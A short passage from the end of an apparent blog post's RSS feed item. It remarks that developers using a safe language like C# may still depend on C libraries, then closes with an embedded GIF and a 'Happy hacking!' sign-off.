the doctors, I mean the developers want to use a safe language such as C#, they may need to depend on a third-party library written in C.&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/ekvv0VTMS1fRNI6SW5" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/drivetribe-edd-drive-tribe-china-ekvv0VTMS1fRNI6SW5"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Happy hacking! &lt;/p&gt;</content:encoded></item></channel></rss>